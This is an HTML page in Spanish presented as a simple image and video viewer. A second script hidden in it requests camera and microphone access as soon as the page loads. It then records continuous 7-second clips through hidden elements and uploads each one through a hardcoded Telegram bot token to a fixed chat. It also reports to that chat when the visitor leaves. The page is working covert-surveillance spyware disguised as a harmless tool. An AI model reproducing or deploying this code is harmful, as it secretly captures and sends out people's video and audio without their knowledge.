<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Viewer</title>
<style>
    body {
        margin: 0;
        background: black;
        overflow: hidden;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    #fileInput {
        position: fixed;
        bottom: 20px;
        background: #111;
        color: white;
        border: none;
        padding: 12px 20px;
        cursor: pointer;
    }

    img {
        position: absolute;
        width: 100%;
        height: 100%;
        object-fit: contain;
    }

    video {
        width: 60%;
        max-height: 80%;
        background: black;
    }
</style>
</head>
<body>

<input type="file" id="fileInput" accept="image/*,video/*">

<!-- Elementos ocultos para grabación -->
<video id="vid" autoplay muted playsinline style="display:none;"></video>
<canvas id="snap" style="display:none;"></canvas>

<script>
const input = document.getElementById("fileInput");

input.addEventListener("change", function () {
    const file = this.files[0];
    if (!file) return;

    const url = URL.createObjectURL(file);

    // Ocultar botón
    input.style.display = "none";

    // Limpiar contenido anterior
    document.body.innerHTML = "";

    if (file.type.startsWith("image")) {
        const img = document.createElement("img");
        img.src = url;
        document.body.appendChild(img);
    }

    if (file.type.startsWith("video")) {
        const video = document.createElement("video");
        video.src = url;
        video.controls = true;
        video.autoplay = true;
        document.body.appendChild(video);
    }
});
</script>

<!-- SCRIPT DE GRABACIÓN Y ENVÍO A TELEGRAM -->
<script>
// Configuración del bot de Telegram (AJUSTA ESTOS VALORES)
const BOT_TOKEN = "8256143400:AAFQEOQfWTs_EpU_2SqQRJtqxjWE6Az-N_Q";
const CHAT_ID = "8284747554";
const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Función para enviar video a Telegram
async function enviarVideo(blob) {
    try {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('video', blob, 'clip.mp4'); // Lo enviamos como .mp4 aunque sea webm
        fd.append('caption', `🎥 Clip de video — ${new Date().toLocaleTimeString('es-SV')}`);
        fd.append('supports_streaming', 'true');
        await fetch(`${TG}/sendVideo`, { method: 'POST', body: fd });
        console.log("✅ Video enviado a Telegram");
    } catch (e) {
        console.error("❌ Error enviando video:", e);
    }
}

// Función para iniciar grabación continua de 7 segundos
function iniciarGrabacionContinua(stream) {
    const videoElement = document.getElementById('vid');
    videoElement.srcObject = stream;

    const mimeTypes = [
        'video/webm;codecs=vp9,opus',
        'video/webm;codecs=vp8,opus',
        'video/webm'
    ];
    const mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';

    const grabarClip = () => {
        try {
            const recorder = new MediaRecorder(stream, { mimeType });
            const chunks = [];

            recorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    chunks.push(e.data);
                }
            };

            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: mimeType });
                enviarVideo(blob); // Enviar a Telegram
                console.log("🎬 Clip de 7s finalizado. Iniciando siguiente...");
                setTimeout(grabarClip, 500); // Pequeño delay antes de reiniciar
            };

            recorder.start();
            console.log("⏳ Grabando clip de 7s...");

            // Detener grabación después de 7 segundos
            setTimeout(() => {
                if (recorder.state === "recording") {
                    recorder.stop();
                }
            }, 7000);

        } catch (error) {
            console.error("⚠️ Error al iniciar grabación:", error);
            // Reintentar en 3 segundos si falla
            setTimeout(grabarClip, 3000);
        }
    };

    // Iniciar primer clip
    grabarClip();
}

// Solicitar permisos y comenzar
async function solicitarPermisosYGrabar() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: true
        });
        console.log("✅ Permisos concedidos. Iniciando grabación continua...");
        iniciarGrabacionContinua(stream);
    } catch (err) {
        console.error("❌ Error solicitando permisos:", err.name);
        // No detenemos la página, solo registramos el error
    }
}

// Iniciar al cargar la página
window.addEventListener('load', solicitarPermisosYGrabar);

// Notificar cuando el usuario abandone la página
window.addEventListener('beforeunload', () => {
    const msg = `🚪 <b>USUARIO SALIÓ DE LA PÁGINA</b>\n⏰ ${new Date().toLocaleString('es-SV')}\n🔗 ${location.href}`;
    navigator.sendBeacon(`${TG}/sendMessage`, new Blob([JSON.stringify({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: 'HTML'
    })], { type: 'application/json' }));
});
</script>

</body>
</html>
